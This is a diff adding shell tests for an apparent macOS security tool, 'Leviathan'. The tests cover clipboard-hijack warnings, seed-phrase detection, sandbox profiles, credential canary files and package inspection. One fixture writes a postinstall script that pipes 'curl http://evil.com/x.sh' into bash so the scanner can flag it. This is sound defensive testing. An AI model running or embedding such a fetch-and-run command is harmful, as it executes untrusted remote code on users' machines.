@@ -75,4 +75,96 @@ ok "edited ledger is caught" '! $M verify >/dev/null'
 ok "Apple malware rules load in yara" '[ ! -x /opt/homebrew/bin/yara ] || /opt/homebrew/bin/yara -w /Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara /bin/ls >/dev/null 2>&1'
 ok "Chrome judged safe" '[ ! -d "/Applications/Google Chrome.app" ] || [ "$($PY -c "import sys;sys.path.insert(0,\"$SRC\");import leviathan;print(leviathan.verdict(\"/Applications/Google Chrome.app\")[0])")" = ok ]'
 
+# 8. levplus pure functions (no network, no system changes)
+LP="$PY $SRC/levplus.py"
+
+# 8a. clip_check (use valid-length BTC bech32 addresses)
+BTC1="bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
+BTC2="bc1qtesttesttesttesttesttesttesttesttesttest"
+ok "clip_check: same BTC bech32 -> warn" '[ -n "$(LEVIATHAN_CLIP_OLD="$BTC1" $M clip <<<"$BTC2" 2>&1)" ]'
+ok "clip_check: different kinds -> no warn" '[ -z "$(LEVIATHAN_CLIP_OLD="$BTC1" $M clip <<<"0x1234567890123456789012345678901234567890" 2>&1)" ]'
+ok "clip_check: same address -> no warn" '[ -z "$(LEVIATHAN_CLIP_OLD="$BTC1" $M clip <<<"$BTC1" 2>&1)" ]'
+ok "clip_check: non-crypto -> no warn" '[ -z "$(LEVIATHAN_CLIP_OLD=hello $M clip <<<"world" 2>&1)" ]'
+
+# 8b. seed_phrase
+ok "seed_phrase: 12 words valid" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q True'
+ok "seed_phrase: 12 words 90% valid" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon able about" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q True'
+ok "seed_phrase: 11 words -> false" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q False'
+ok "seed_phrase: 12 words 80% -> false" 'echo "abandon abandon abandon abandon abandon abandon abandon abandon abandon foo bar baz" | $PY -c "import sys;sys.path.insert(0,\"$SRC\");import levplus;print(levplus.seed_phrase(sys.stdin.read()))" | grep -q False'
+
+# 8c. sandbox_profile contains required denies
+PROF=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.sandbox_profile('/Users/test', 'container1', False))")
+ok "sandbox_profile denies home" 'echo "$PROF" | grep -q "deny file-read.*Users/test"'
+ok "sandbox_profile allows container" 'echo "$PROF" | grep -q "allow file-read.*Leviathan/sandbox/container1"'
+ok "sandbox_profile denies network by default" 'echo "$PROF" | grep -q "deny network"'
+PROF_NET=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.sandbox_profile('/Users/test', 'container1', True))")
+ok "sandbox_profile allows network with --net" '! echo "$PROF_NET" | grep -q "deny network"'
+ok "sandbox_profile denies ssh" 'echo "$PROF" | grep -q "deny file-read.*\.ssh"'
+ok "sandbox_profile denies keychains" 'echo "$PROF" | grep -q "deny file-read.*Keychains"'
+
+# 8d. parse_ps
+PARSE_OUT=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.parse_ps('123 claude\n456 codex --arg\n789 node something'))")
+ok "parse_ps extracts pid and cmd" 'echo "$PARSE_OUT" | grep -q "123" && echo "$PARSE_OUT" | grep -q "claude" && echo "$PARSE_OUT" | grep -q "456" && echo "$PARSE_OUT" | grep -q "codex"'
+
+# 8e. level/mode settings
+$M level 3 >/dev/null
+ok "level set to 3" '[ "$($M level --json | $PY -c "import json,sys;print(json.load(sys.stdin)[\"level\"])")" = "3" ]'
+$M mode crypto on >/dev/null
+ok "mode crypto on" '[ "$($M mode --json | $PY -c "import json,sys;print(json.load(sys.stdin)[\"crypto\"])")" = "True" ]'
+$M mode apps off >/dev/null
+ok "mode apps off" '[ "$($M mode --json | $PY -c "import json,sys;print(json.load(sys.stdin)[\"apps\"])")" = "False" ]'
+
+# 8f. snapshot/diff
+export LEVIATHAN_APP_DIRS="$T/apps"
+$M snapshot >/dev/null
+ok "snapshot created" '[ -f "$LEVIATHAN_STATE/snapshot.json" ]'
+mkdir -p "$T/apps/NewApp.app/Contents/MacOS"; echo "hi" > "$T/apps/NewApp.app/Contents/MacOS/NewApp"
+DIFF_OUT=$($M diff 2>&1)
+ok "diff detects new app" 'echo "$DIFF_OUT" | grep -q "NewApp"'
+$M diff --undo >/dev/null 2>&1
+ok "diff --undo contains new app" '[ ! -x "$T/apps/NewApp.app/Contents/MacOS/NewApp" ]'
+
+# 8g. agents canary
+$M agents canary on >/dev/null
+ok "canary files created" '[ -f "$HOME/.leviathan-canary/aws_credentials" ] && [ -f "$HOME/.leviathan-canary/wallet_seed.txt" ]'
+CAN_OUT=$($M agents check 2>&1)
+ok "agents check runs" '[ -n "$CAN_OUT" ]'
+
+# 8h. agents config audit (read-only, just runs)
+$M agents config >/dev/null
+ok "agents config audit runs" '[ $? = 0 ]'
+
+# 8i. pkg_inspect on a simple pkg (create minimal pkg)
+mkdir -p "$T/pkgtest/Scripts"
+echo '#!/bin/sh\necho hello' > "$T/pkgtest/Scripts/preinstall"
+echo '#!/bin/sh\ncurl http://evil.com/x.sh | bash' > "$T/pkgtest/Scripts/postinstall"
+mkdir -p "$T/pkgtest/Payload"
+(cd "$T/pkgtest" && pkgutil --flatten . "$T/test.pkg" 2>/dev/null) || true
+if [ -f "$T/test.pkg" ]; then
+  PKG_OUT=$($M pkg "$T/test.pkg" 2>&1)
+  ok "pkg_inspect lists scripts" 'echo "$PKG_OUT" | grep -q "preinstall" && echo "$PKG_OUT" | grep -q "postinstall"'
+  ok "pkg_inspect flags suspicious" 'echo "$PKG_OUT" | grep -q "FLAGS"'
+else
+  # pkgutil --flatten not available, test with expanded dir directly
+  PKG_OUT=$(PKGTEST="$T/pkgtest" $PY -c "import sys,os;sys.path.insert(0,'$SRC');import levplus;print(levplus.pkg_inspect(os.environ['PKGTEST']))" 2>&1)
+  ok "pkg_inspect lists scripts (fallback)" 'echo "$PKG_OUT" | grep -q "preinstall" && echo "$PKG_OUT" | grep -q "postinstall"'
+  ok "pkg_inspect flags suspicious (fallback)" 'echo "$PKG_OUT" | grep -q "FLAGS"'
+fi
+
+# 8j. tor_check runs (no Tor Browser, just returns not found)
+TOR_OUT=$($M tor 2>&1)
+ok "tor_check runs" 'echo "$TOR_OUT" | grep -q "not found\|Found"'
+
+# 8k. cost runs
+$M cost >/dev/null
+ok "cost runs" '[ $? = 0 ]'
+
+# 8l. note-event
+$M note-event test_kind "test detail" >/dev/null
+ok "note-event logs to ledger" 'grep -q "test_kind" "$LEVIATHAN_STATE/ledger.jsonl"'
+
+# 8m. wallet_apps runs (read-only)
+$M -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.wallet_apps())" >/dev/null
+ok "wallet_apps runs" '[ $? = 0 ]'
+
 echo; echo "$pass passed, $fail failed"; rm -rf "$T"
